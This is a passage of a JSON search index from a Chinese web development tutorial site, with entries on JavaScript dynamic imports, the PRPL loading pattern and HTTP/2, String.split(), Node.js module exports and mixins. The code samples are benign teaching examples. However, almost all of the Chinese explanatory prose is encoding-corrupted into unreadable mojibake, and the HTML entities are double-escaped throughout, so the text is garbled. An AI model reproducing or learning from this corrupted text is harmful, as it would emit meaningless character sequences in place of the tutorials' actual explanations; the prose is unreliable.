console.log(\u0026#34;Multiply: \u0026#34;, module.multiply(3, 2)); const button = document.getElementById(\u0026#34;btn\u0026#34;); button.innerHTML = \u0026#34;Check the console\u0026#34;; }); }); /*************************** */ /**** Or with async/await ****/ /*************************** */ // button.addEventListener(\u0026#34;click\u0026#34;, async () =\u0026gt; { // const module = await import(\u0026#34;./math.js\u0026#34;); // console.log(\u0026#34;Add: \u0026#34;, module.add(1, 2)); // console.log(\u0026#34;Multiply: \u0026#34;, module.multiply(3, 2)); // });   é€šè¿‡åŠ¨æ€å¯¼å…¥æ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥å‡å°‘é¡µé¢åŠ è½½æ—¶é—´ã€‚ æˆ‘ä»¬åªéœ€è¦åœ¨ç”¨æˆ·éœ€è¦æ—¶åŠ è½½ã€è§£æå’Œç¼–è¯‘ç”¨æˆ·çœŸæ­£éœ€è¦çš„ä»£ç ã€‚\né™¤äº†èƒ½å¤ŸæŒ‰éœ€å¯¼å…¥æ¨¡å—ä¹‹å¤–ï¼Œimport() å‡½æ•°è¿˜å¯ä»¥æ¥æ”¶è¡¨è¾¾å¼ã€‚ å®ƒå…è®¸æˆ‘ä»¬ä¼ é€’æ¨¡æ¿æ–‡å­—ï¼Œä»¥ä¾¿æ ¹æ®ç»™å®šå€¼åŠ¨æ€åŠ è½½æ¨¡å—ã€‚\nåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œä»…å½“ç”¨æˆ·å•å‡»â€œå•å‡»ä»¥åŠ è½½æ—¥æœŸâ€æŒ‰é’®æ—¶æ‰ä¼šå¯¼å…¥ date.js æ¨¡å—ã€‚ date.js æ¨¡å—å¯¼å…¥ç¬¬ä¸‰æ–¹çš„ moment æ¨¡å—ï¼Œåªæœ‰åœ¨åŠ è½½ date.js æ¨¡å—æ—¶æ‰ä¼šå¯¼å…¥ã€‚ å¦‚æœç”¨æˆ·ä¸éœ€è¦æ˜¾ç¤ºæ—¥æœŸï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨é¿å…åŠ è½½è¿™ä¸ªç¬¬ä¸‰æ–¹åº“ã€‚\nç”¨æˆ·å•å‡»â€œå•å‡»ä»¥åŠ è½½å›¾åƒâ€æŒ‰é’®åï¼Œå°†åŠ è½½æ¯ä¸ªå›¾åƒã€‚ å›¾åƒæ˜¯æœ¬åœ° .png æ–‡ä»¶ï¼Œå®ƒä»¬æ ¹æ®æˆ‘ä»¬ä¼ é€’ç»™å­—ç¬¦ä¸²çš„ num å€¼åŠ è½½ã€‚\nconst res = await import(`../assets/dog${num}.png`); è¿™æ ·ï¼Œæˆ‘ä»¬ä¸ä¾èµ–äºç¡¬ç¼–ç çš„æ¨¡å—è·¯å¾„ã€‚ å®ƒå¢åŠ äº†æ‚¨å¯ä»¥æ ¹æ®ç”¨æˆ·è¾“å…¥ã€ä»å¤–éƒ¨æºæ¥æ”¶çš„æ•°æ®ã€å‡½æ•°çš„ç»“æœç­‰å¯¼å…¥æ¨¡å—çš„æ–¹å¼çš„çµæ´»æ€§ã€‚\n\rä¼˜ç‚¹ ä½¿ç”¨æ¨¡å—æ¨¡å¼ï¼Œå¯ä»¥å°è£…ä¸åº”å…¬å¼€çš„ä»£ç éƒ¨åˆ†ã€‚ è¿™å¯ä»¥é˜²æ­¢æ„å¤–çš„åç§°å†²çªå’Œå…¨å±€èŒƒå›´æ±¡æŸ“ï¼Œä»è€Œé™ä½ä½¿ç”¨å¤šä¸ªä¾èµ–é¡¹å’Œå‘½åç©ºé—´çš„é£é™©ã€‚ ä¸ºäº†èƒ½å¤Ÿåœ¨æ‰€æœ‰ JavaScript è¿è¡Œæ—¶ä¸­ä½¿ç”¨ ES2015 æ¨¡å—ï¼Œéœ€è¦åƒ Babel è¿™æ ·çš„è½¬è¯‘å™¨ã€‚\n\rçŸ¥è¯†ç‚¹  export å‘½åå¯¼å‡º import { module } from \u0026lsquo;module\u0026rsquo; å‘½åå¯¼å…¥ as é‡å‘½åå¯¼å…¥çš„å€¼ import {a as b} from \u0026lsquo;module\u0026rsquo;, å°†aå‘½åä¸ºb export default é»˜è®¤å¯¼å‡º import module from \u0026lsquo;module\u0026rsquo; é»˜è®¤å¯¼å…¥ï¼ˆæˆ–è€… import a as b from \u0026lsquo;module\u0026rsquo;ï¼‰ * æ‰€æœ‰å‘½åå¯¼å‡ºå’Œé»˜è®¤å¯¼å‡º await import(module) åŠ¨æ€åŠ è½½  ","description":"å°†æ‚¨çš„ä»£ç æ‹†åˆ†æˆæ›´å°çš„ã€å¯é‡ç”¨çš„éƒ¨åˆ†","id":107,"section":"react-patterns","tags":null,"title":"æ¨¡å—æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/module-pattern/"},{"content":"ä½¿åº”ç”¨ç¨‹åºåœ¨å…¨çƒèŒƒå›´å†…å¯è®¿é—®å¯èƒ½æ˜¯ä¸€ä¸ªæŒ‘æˆ˜ï¼\næˆ‘ä»¬å¿…é¡»ç¡®ä¿åº”ç”¨ç¨‹åºåœ¨ä½ç«¯è®¾å¤‡å’Œäº’è”ç½‘è¿æ¥è¾ƒå·®çš„åœ°åŒºè¿è¡Œè‰¯å¥½ã€‚ ä¸ºäº†ç¡®ä¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨å›°éš¾çš„æ¡ä»¶ä¸‹å°½å¯èƒ½é«˜æ•ˆåœ°åŠ è½½ï¼Œå¯ä»¥ä½¿ç”¨ PRPL æ¨¡å¼ã€‚\nPRPL æ¨¡å¼ä¾§é‡äºå››ä¸ªä¸»è¦çš„æ€§èƒ½è€ƒè™‘ï¼š\n  æœ‰æ•ˆåœ°æ¨é€å…³é”®èµ„æºï¼Œä»è€Œæœ€å¤§é™åº¦åœ°å‡å°‘åˆ°æœåŠ¡å™¨çš„å¾€è¿”æ¬¡æ•°å¹¶å‡å°‘åŠ è½½æ—¶é—´ã€‚\n  å°½å¿«æ¸²æŸ“åˆå§‹è·¯çº¿ï¼Œæå‡ç”¨æˆ·ä½“éªŒ\n  ä¸ºç»å¸¸è®¿é—®çš„è·¯ç”±åœ¨åå°é¢„å…ˆç¼“å­˜èµ„äº§ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘å¯¹æœåŠ¡å™¨çš„è¯·æ±‚é‡å¹¶å®ç°æ›´å¥½çš„ç¦»çº¿ä½“éªŒ\n  å»¶è¿ŸåŠ è½½è¯·æ±‚ä¸é¢‘ç¹çš„è·¯çº¿æˆ–èµ„äº§\n  å½“æˆ‘ä»¬æƒ³è¦è®¿é—®ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œé¦–å…ˆå¿…é¡»å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚æ‰èƒ½è·å–è¿™äº›èµ„æºã€‚\nå…¥å£ç‚¹æŒ‡å‘çš„æ–‡ä»¶ä»æœåŠ¡å™¨è¿”å›ï¼Œé€šå¸¸æ˜¯åº”ç”¨ç¨‹åºçš„åˆå§‹ HTML æ–‡ä»¶ï¼\næµè§ˆå™¨çš„ HTML è§£æå™¨ä¸€å¼€å§‹ä»æœåŠ¡å™¨æ¥æ”¶æ•°æ®ï¼Œå°±ä¼šå¼€å§‹è§£æè¿™äº›æ•°æ®ã€‚\nå¦‚æœè§£æå™¨å‘ç°éœ€è¦æ›´å¤šèµ„æºï¼Œä¾‹å¦‚æ ·å¼è¡¨æˆ–è„šæœ¬ï¼Œåˆ™ä¼šå‘æœåŠ¡å™¨å‘é€å¦ä¸€ä¸ª HTTP è¯·æ±‚ä»¥è·å–è¿™äº›èµ„æºï¼\nå¿…é¡»é‡å¤è¯·æ±‚èµ„æºå¹¶ä¸æ˜¯æœ€ä¼˜çš„ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨å°è¯•æœ€å°åŒ–å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„å¾€è¿”æ¬¡æ•°ï¼\n\rHTTP é•¿æœŸä»¥æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ HTTP/1.1 æ¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚\nå°½ç®¡ä¸ HTTP/1.0 ç›¸æ¯”ï¼ŒHTTP/1.1 å¼•å…¥äº†è®¸å¤šæ”¹è¿›ï¼Œä¾‹å¦‚èƒ½å¤Ÿåœ¨ä½¿ç”¨ keep-alive æ ‡å¤´å‘é€æ–° HTTP è¯·æ±‚ä¹‹å‰ä¿æŒå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ TCP è¿æ¥å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›é—®é¢˜ å¾…è§£å†³ï¼\nä¸ HTTP/1.1 ç›¸æ¯”ï¼ŒHTTP/2 å¼•å…¥äº†ä¸€äº›é‡å¤§å˜åŒ–ï¼Œè¿™ä½¿æˆ‘ä»¬å¯ä»¥æ›´è½»æ¾åœ°ä¼˜åŒ–å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ¶ˆæ¯äº¤æ¢ã€‚\nHTTP/1.1 åœ¨è¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨æ¢è¡Œç¬¦åˆ†éš”çš„çº¯æ–‡æœ¬åè®®ï¼ŒHTTP/2 å°†è¯·æ±‚å’Œå“åº”æ‹†åˆ†ä¸ºç§°ä¸ºå¸§çš„æ›´å°çš„éƒ¨åˆ†ã€‚\nåŒ…å«æ ‡å¤´å’Œæ­£æ–‡å­—æ®µçš„ HTTP è¯·æ±‚è‡³å°‘è¢«æ‹†åˆ†ä¸ºä¸¤ä¸ªå¸§ï¼šæ ‡å¤´å¸§å’Œæ•°æ®å¸§ï¼\nHTTP/1.1 åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æœ€å¤šæœ‰ 6 ä¸ª TCP è¿æ¥ã€‚\nåœ¨é€šè¿‡ç›¸åŒçš„ TCP è¿æ¥å‘é€æ–°è¯·æ±‚ä¹‹å‰ï¼Œå¿…é¡»å…ˆè§£å†³å…ˆå‰çš„è¯·æ±‚ï¼\nå¦‚æœå‰ä¸€ä¸ªè¯·æ±‚éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½è§£å†³ï¼Œåˆ™æ­¤è¯·æ±‚ä¼šé˜»æ­¢å‘é€å…¶ä»–è¯·æ±‚ã€‚\nè¿™ä¸ªå¸¸è§çš„é—®é¢˜å«åš head of line é˜»å¡ï¼Œä¼šå¢åŠ æŸäº›èµ„æºçš„åŠ è½½æ—¶é—´ï¼\nHTTP/2 ä½¿ç”¨åŒå‘æµï¼Œè¿™ä½¿å¾—å•ä¸ª TCP è¿æ¥åŒ…å«å¤šä¸ªåŒå‘æµæˆä¸ºå¯èƒ½ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æºå¸¦å¤šä¸ªè¯·æ±‚å’Œå“åº”å¸§ï¼\nä¸€æ—¦æœåŠ¡å™¨æ”¶åˆ°è¯¥ç‰¹å®šè¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¸§ï¼Œå®ƒå°±ä¼šé‡æ–°ç»„åˆå®ƒä»¬å¹¶ç”Ÿæˆå“åº”å¸§ã€‚\nè¿™äº›å“åº”å¸§è¢«å‘é€å›å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é‡æ–°ç»„åˆå®ƒä»¬ã€‚ç”±äºæµæ˜¯åŒå‘çš„ï¼Œå¯ä»¥é€šè¿‡åŒä¸€ä¸ªæµå‘é€è¯·æ±‚å’Œå“åº”å¸§ã€‚\nHTTP/2 é€šè¿‡å…è®¸åœ¨å‰ä¸€ä¸ªè¯·æ±‚è§£å†³ä¹‹å‰åœ¨åŒä¸€ä¸ª TCP è¿æ¥ä¸Šå‘é€å¤šä¸ªè¯·æ±‚æ¥è§£å†³è¡Œé¦–é˜»å¡ï¼\n\rHTTP 2 æœåŠ¡å™¨æ¨é€ HTTP/2 è¿˜å¼•å…¥äº†ä¸€ç§æ›´ä¼˜åŒ–çš„æ•°æ®è·å–æ–¹å¼ï¼Œç§°ä¸ºæœåŠ¡å™¨æ¨é€ã€‚ ä¸å¿…æ¯æ¬¡éƒ½é€šè¿‡å‘é€ HTTP è¯·æ±‚æ¥æ˜ç¡®è¯·æ±‚èµ„æºï¼ŒæœåŠ¡å™¨å¯ä»¥é€šè¿‡â€œæ¨é€â€è¿™äº›èµ„æºæ¥è‡ªåŠ¨å‘é€é¢å¤–çš„èµ„æºã€‚\nå®¢æˆ·ç«¯æ”¶åˆ°é™„åŠ èµ„æºåï¼Œè¿™äº›èµ„æºå°†å­˜å‚¨åœ¨æµè§ˆå™¨ç¼“å­˜ä¸­ã€‚ å½“åœ¨è§£æå…¥å£æ–‡ä»¶æ—¶å‘ç°èµ„æºæ—¶ï¼Œæµè§ˆå™¨å¯ä»¥å¿«é€Ÿä»ç¼“å­˜ä¸­è·å–èµ„æºï¼Œè€Œä¸å¿…å‘æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚ï¼\nå°½ç®¡æ¨é€èµ„æºå‡å°‘äº†æ¥æ”¶é¢å¤–èµ„æºçš„æ—¶é—´ï¼Œä½†æœåŠ¡å™¨æ¨é€å¹¶ä¸æ”¯æŒ HTTP ç¼“å­˜ï¼ ä¸‹æ¬¡è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œæˆ‘ä»¬å°†æ— æ³•ä½¿ç”¨æ¨é€çš„èµ„æºï¼Œå¿…é¡»å†æ¬¡è¯·æ±‚ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒPRPL æ¨¡å¼åœ¨åˆå§‹åŠ è½½åä½¿ç”¨æœåŠ¡å·¥ä½œè€…æ¥ç¼“å­˜è¿™äº›èµ„æºï¼Œä»¥ç¡®ä¿å®¢æˆ·ç«¯ä¸ä¼šå‘å‡ºä¸å¿…è¦çš„è¯·æ±‚ã€‚\n\rå…³é”®èµ„æºé¢„åŠ è½½ ä½œä¸ºç½‘ç«™çš„ä½œè€…ï¼Œæˆ‘ä»¬é€šå¸¸çŸ¥é“å“ªäº›èµ„æºæ˜¯æ—©æœŸè·å–çš„å…³é”®ï¼Œè€Œæµè§ˆå™¨ä¼šå°½åŠ›çŒœæµ‹è¿™ä¸€ç‚¹ã€‚ å¹¸è¿çš„æ˜¯ï¼Œå¯ä»¥é€šè¿‡å‘å…³é”®èµ„æºæ·»åŠ é¢„åŠ è½½èµ„æºæç¤ºæ¥å¸®åŠ©æµè§ˆå™¨ï¼\né€šè¿‡å‘Šè¯‰æµè§ˆå™¨æƒ³è¦é¢„åŠ è½½æŸä¸ªèµ„æºï¼Œå°±æ˜¯åœ¨å‘Šè¯‰æµè§ˆå™¨æ‚¨å¸Œæœ›æ¯”æµè§ˆå™¨å‘ç°å®ƒæ›´å¿«åœ°è·å–å®ƒï¼ é¢„åŠ è½½æ˜¯ä¼˜åŒ–åŠ è½½å¯¹å½“å‰è·¯ç”±è‡³å…³é‡è¦çš„èµ„æºæ‰€éœ€æ—¶é—´çš„å¥½æ–¹æ³•ã€‚\nå°½ç®¡é¢„åŠ è½½èµ„æºæ˜¯å‡å°‘å¾€è¿”æ¬¡æ•°å’Œä¼˜åŒ–åŠ è½½æ—¶é—´çš„å¥½æ–¹æ³•ï¼Œä½†æ¨é€å¤ªå¤šæ–‡ä»¶å¯èƒ½æœ‰å®³ã€‚ æµè§ˆå™¨çš„ç¼“å­˜æ˜¯æœ‰é™çš„ï¼Œå¯èƒ½ä¼šé€šè¿‡è¯·æ±‚å®¢æˆ·ç«¯å®é™…ä¸Šä¸éœ€è¦çš„èµ„æºæ¥ä¸å¿…è¦åœ°ä½¿ç”¨å¸¦å®½ã€‚\n\rPRPL æ¨¡å¼ PRPL æ¨¡å¼ä¾§é‡äºä¼˜åŒ–åˆå§‹è´Ÿè½½ã€‚ åœ¨åˆå§‹è·¯ç”±å®Œå…¨åŠ è½½å’Œå‘ˆç°ä¹‹å‰ï¼Œä¸ä¼šåŠ è½½å…¶ä»–èµ„æºï¼\nå¯ä»¥é€šè¿‡å°†åº”ç”¨ç¨‹åºä»£ç æ‹†åˆ†æˆå°çš„ã€é«˜æ€§èƒ½çš„åŒ…æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ è¿™äº›æ†ç»‘åŒ…åº”è¯¥ä½¿ç”¨æˆ·å¯ä»¥ä»…åœ¨éœ€è¦æ—¶åŠ è½½ä»–ä»¬éœ€è¦çš„èµ„æºï¼ŒåŒæ—¶æœ€å¤§é™åº¦åœ°æé«˜å¯ç¼“å­˜æ€§ï¼\nç¼“å­˜è¾ƒå¤§çš„åŒ…å¯èƒ½æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚ å¯èƒ½å‘ç”Ÿå¤šä¸ªåŒ…å…±äº«ç›¸åŒçš„èµ„æºã€‚\næµè§ˆå™¨å¾ˆéš¾è¯†åˆ« bundle çš„å“ªäº›éƒ¨åˆ†åœ¨å¤šä¸ªè·¯ç”±ä¹‹é—´å…±äº«ï¼Œå› æ­¤æ— æ³•ç¼“å­˜è¿™äº›èµ„æºã€‚\nç¼“å­˜èµ„æºå¯¹äºå‡å°‘åˆ°æœåŠ¡å™¨çš„å¾€è¿”æ¬¡æ•°å¾ˆé‡è¦ï¼Œå¹¶ä½¿æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºç¦»çº¿å‹å¥½ï¼\nåœ¨ä½¿ç”¨ PRPL æ¨¡å¼æ—¶ï¼Œéœ€è¦ç¡®ä¿è¯·æ±‚çš„åŒ…åŒ…å«å½“æ—¶æ‰€éœ€çš„æœ€å°‘èµ„æºï¼Œå¹¶ä¸”å¯ä»¥è¢«æµè§ˆå™¨ç¼“å­˜ã€‚\nåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™å¯èƒ½æ„å‘³ç€æ ¹æœ¬æ²¡æœ‰æ†ç»‘ä¼šæ›´é«˜æ•ˆï¼Œå¯ä»¥ç®€å•åœ°ä½¿ç”¨æœªæ†ç»‘çš„æ¨¡å—ï¼\né€šè¿‡å°†æµè§ˆå™¨å’ŒæœåŠ¡å™¨é…ç½®ä¸ºæ”¯æŒ HTTP/2 æ¨é€å¹¶æœ‰æ•ˆåœ°ç¼“å­˜èµ„æºï¼Œå¯ä»¥è½»æ¾åœ°æ¨¡æ‹Ÿé€šè¿‡æ†ç»‘åº”ç”¨ç¨‹åºæ¥åŠ¨æ€è¯·æ±‚æœ€å°‘èµ„æºçš„å¥½å¤„ã€‚\nå¯¹äºä¸æ”¯æŒ HTTP/2 æœåŠ¡å™¨æ¨é€çš„æµè§ˆå™¨ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªç»è¿‡ä¼˜åŒ–çš„æ„å»ºï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘å¾€è¿”æ¬¡æ•°ã€‚\nå®¢æˆ·ç«¯ä¸å¿…çŸ¥é“å®ƒæ¥æ”¶çš„æ˜¯æ†ç»‘èµ„æºè¿˜æ˜¯éæ†ç»‘èµ„æºï¼šæœåŠ¡å™¨ä¸ºæ¯ä¸ªæµè§ˆå™¨æä¾›é€‚å½“çš„æ„å»ºã€‚\nPRPL æ¨¡å¼é€šå¸¸ä½¿ç”¨ app shell ä½œä¸ºå…¶ä¸»è¦å…¥å£ç‚¹ï¼Œè¿™æ˜¯ä¸€ä¸ªåŒ…å«å¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºé€»è¾‘å¹¶åœ¨è·¯ç”±ä¹‹é—´å…±äº«çš„æœ€å°æ–‡ä»¶ï¼ å®ƒè¿˜åŒ…å«åº”ç”¨ç¨‹åºçš„è·¯ç”±å™¨ï¼Œå®ƒå¯ä»¥åŠ¨æ€è¯·æ±‚å¿…è¦çš„èµ„æºã€‚\nPRPL æ¨¡å¼ç¡®ä¿åœ¨åˆå§‹è·¯ç”±åœ¨ç”¨æˆ·è®¾å¤‡ä¸Šå¯è§ä¹‹å‰ä¸ä¼šè¯·æ±‚æˆ–å‘ˆç°å…¶ä»–èµ„æºã€‚ ä¸€æ—¦æˆåŠŸåŠ è½½äº†åˆå§‹è·¯ç”±ï¼Œå°±å¯ä»¥å®‰è£…æœåŠ¡å™¨å·¥ä½œè€…ï¼Œä»¥ä¾¿åœ¨åå°ä¸ºå…¶ä»–ç»å¸¸è®¿é—®çš„è·¯ç”±è·å–èµ„æºï¼\nç”±äºè¿™äº›æ•°æ®æ˜¯åœ¨åå°è·å–çš„ï¼Œå› æ­¤ç”¨æˆ·ä¸ä¼šé‡åˆ°ä»»ä½•å»¶è¿Ÿã€‚ å¦‚æœç”¨æˆ·æƒ³è¦å¯¼èˆªåˆ° Service Worker ç¼“å­˜çš„ç»å¸¸è®¿é—®çš„è·¯ç”±ï¼Œ\nService Worker å¯ä»¥å¿«é€Ÿä»ç¼“å­˜ä¸­è·å–æ‰€éœ€çš„èµ„æºï¼Œè€Œä¸å¿…å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚\nä¸ç»å¸¸è®¿é—®çš„è·¯ç”±èµ„æºå¯ä»¥åŠ¨æ€å¯¼å…¥ã€‚\n\rçŸ¥è¯†ç‚¹   HTTP\n  PRPL\n  ","description":"é€šè¿‡é¢„ç¼“å­˜ã€å»¶è¿ŸåŠ è½½å’Œæœ€å°åŒ–å¾€è¿”æ¥ä¼˜åŒ–åˆå§‹åŠ è½½","id":108,"section":"react-patterns","tags":null,"title":"PRPLæ¨¡å¼","uri":"https://codthing.github.io/react-patterns/performance-patterns/prpl/"},{"content":"split() æ–¹æ³•å°†ä¸€ä¸ªå­—ç¬¦ä¸²åˆ’åˆ†ä¸ºä¸€ä¸ªæœ‰åºçš„å­å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå°†è¿™äº›å­å­—ç¬¦ä¸²æ”¾å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œå¹¶è¿”å›è¯¥æ•°ç»„ã€‚ é™¤æ³•æ˜¯é€šè¿‡æœç´¢æ¨¡å¼æ¥å®Œæˆçš„ï¼› å…¶ä¸­æ¨¡å¼ä½œä¸ºæ–¹æ³•è°ƒç”¨ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°æä¾›ã€‚\n\rä½¿ç”¨ split æ–¹æ³•å°†å­—ç¬¦ä¸²æ‹†åˆ†æˆæ•°ç»„ split æ–¹æ³•å°†ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²æˆä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚\nå®ƒéœ€è¦ä¸€ä¸ªå‚æ•°ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå®ƒå¯ä»¥æ˜¯ç”¨äºæ‹†åˆ†å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªå­—ç¬¦ã€‚\n  å¦‚æœåˆ†éš”ç¬¦æ˜¯ç©ºæ ¼ï¼Œå¾—åˆ°ä¸€ä¸ªå•è¯æ•°ç»„\n  å¦‚æœåˆ†éš”ç¬¦æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªç”±å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦ç»„æˆçš„æ•°ç»„ã€‚\n  1 2 3 4 5 6  const str = \u0026#34;Hello World\u0026#34;; const bySpace = str.split(\u0026#34; \u0026#34;); // [\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;]  const otherString = \u0026#34;How9are7you2today\u0026#34;; const byDigits = otherString.split(/\\d/); // [\u0026#34;How\u0026#34;, \u0026#34;are\u0026#34;, \u0026#34;you\u0026#34;, \u0026#34;today\u0026#34;]   åœ¨ splitify å‡½æ•°ä¸­ç”¨ split æ–¹æ³•å°† str åˆ†å‰²æˆå•è¯æ•°ç»„ã€‚ è¿™ä¸ªæ–¹æ³•åº”è¯¥è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚ å•è¯ä¸ä¸€å®šéƒ½æ˜¯ç”¨ç©ºæ ¼åˆ†éš”ï¼Œæ‰€ä»¥æ•°ç»„ä¸­ä¸åº”åŒ…å«æ ‡ç‚¹ç¬¦å·ã€‚\n1 2 3 4 5 6 7 8  function splitify(str) { return str.split(/\\W/); } splitify(\u0026#34;Hello World,I-am code\u0026#34;); // [ \u0026#39;Hello\u0026#39;, \u0026#39;World\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;am\u0026#39;, \u0026#39;code\u0026#39; ]   ","description":"split() æ–¹æ³•å°†ä¸€ä¸ªå­—ç¬¦ä¸²åˆ’åˆ†ä¸ºä¸€ä¸ªæœ‰åºçš„å­å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå°†è¿™äº›å­å­—ç¬¦ä¸²æ”¾å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œå¹¶è¿”å›è¯¥æ•°ç»„ã€‚ é™¤æ³•æ˜¯é€šè¿‡æœç´¢æ¨¡å¼æ¥å®Œæˆçš„ï¼› å…¶ä¸­æ¨¡å¼ä½œä¸ºæ–¹æ³•è°ƒç”¨ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°æä¾›ã€‚","id":109,"section":"javascript","tags":null,"title":"String.prototype.split()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/split-programming/"},{"content":"Node.js æœ‰ä¸€ä¸ªå†…ç½®çš„æ¨¡å—ç³»ç»Ÿã€‚\nNode.js æ–‡ä»¶å¯ä»¥å¯¼å…¥å…¶ä»– Node.js æ–‡ä»¶å…¬å¼€çš„åŠŸèƒ½ã€‚\nmodule.exports 1 2 3 4 5 6 7 8 9 10  // car.js const car = { brand: \u0026#39;Ford\u0026#39;, model: \u0026#39;Fiesta\u0026#39; } module.exports = car // index.js const car = require(\u0026#39;./car\u0026#39;)   exports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  const car = { brand: \u0026#39;Ford\u0026#39;, model: \u0026#39;Fiesta\u0026#39; } exports.car = car // or exports.car = { brand: \u0026#39;Ford\u0026#39;, model: \u0026#39;Fiesta\u0026#39; } const items = require(\u0026#39;./items\u0026#39;) const car = items.car const car = require(\u0026#39;./items\u0026#39;).car const { car } = require(\u0026#39;./items\u0026#39;)   module.exports å’Œ exports çš„åŒºåˆ« ç¬¬ä¸€ä¸ªå…¬å¼€å®ƒæŒ‡å‘çš„å¯¹è±¡ã€‚åè€…æš´éœ²äº†å®ƒæŒ‡å‘çš„å¯¹è±¡çš„å±æ€§ã€‚\n","description":"","id":110,"section":"nodejs","tags":null,"title":"ä½¿ç”¨ exports","uri":"https://codthing.github.io/nodejs/nodebase/node-export/"},{"content":"é‚£äº›äº‰è®®æœ€å¤§çš„ç¼–ç¨‹è§‚ç‚¹\n","description":"","id":111,"section":"others","tags":null,"title":"æœ‰è¶£çš„æ–‡ç« ","uri":"https://codthing.github.io/others/blog/blog/"},{"content":"mixin æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥å‘å¦ä¸€ä¸ªå¯¹è±¡æˆ–ç±»æ·»åŠ å¯é‡ç”¨çš„åŠŸèƒ½ï¼Œè€Œæ— éœ€ä½¿ç”¨ç»§æ‰¿ã€‚\nä¸èƒ½å•ç‹¬ä½¿ç”¨ mixinï¼šå®ƒä»¬çš„å”¯ä¸€ç›®çš„æ˜¯åœ¨æ²¡æœ‰ç»§æ‰¿çš„æƒ…å†µä¸‹å‘å¯¹è±¡æˆ–ç±»æ·»åŠ åŠŸèƒ½ã€‚\n\råˆ›å»ºä¸€ä¸ª mixin å‡è®¾å¯¹äºæˆ‘ä»¬çš„åº”ç”¨ç¨‹åºï¼Œéœ€è¦åˆ›å»ºå¤šä¸ªç‹—ã€‚ ç„¶è€Œï¼Œåˆ›å»ºçš„åŸºæœ¬ç‹—æ²¡æœ‰ä»»ä½•å±æ€§ï¼Œåªæœ‰ä¸€ä¸ªåç§°å±æ€§ã€‚\nclass Dog {\rconstructor(name) {\rthis.name = name;\r}\r} ä¸€åªç‹—åº”è¯¥èƒ½å¤Ÿåšçš„ä¸ä»…ä»…æ˜¯æœ‰ä¸€ä¸ªåå­—ã€‚ å®ƒåº”è¯¥ä¼šå å«ã€æ‘‡å°¾å·´å’Œç©è€ï¼\nå¯ä»¥åˆ›å»ºä¸€ä¸ª mixinï¼Œä¸ºæˆ‘ä»¬æä¾› barkã€wagTail å’Œ play å±æ€§ï¼Œè€Œä¸æ˜¯ç›´æ¥å°†å…¶æ·»åŠ åˆ° Dog ä¸­ã€‚\nconst dogFunctionality = {\rbark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;),\rwagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;),\rplay: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;)\r}; æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Object.assign æ–¹æ³•å°† dogFunctionality mixin æ·»åŠ åˆ° Dog åŸå‹ä¸­ã€‚\næ­¤æ–¹æ³•å‘ç›®æ ‡å¯¹è±¡æ·»åŠ å±æ€§ï¼šåœ¨æœ¬ä¾‹ä¸­ä¸º Dog.prototypeã€‚\nDog çš„æ¯ä¸ªæ–°å®ä¾‹éƒ½å¯ä»¥è®¿é—® dogFunctionality çš„å±æ€§ï¼Œå› ä¸ºå®ƒä»¬å·²æ·»åŠ åˆ° Dog 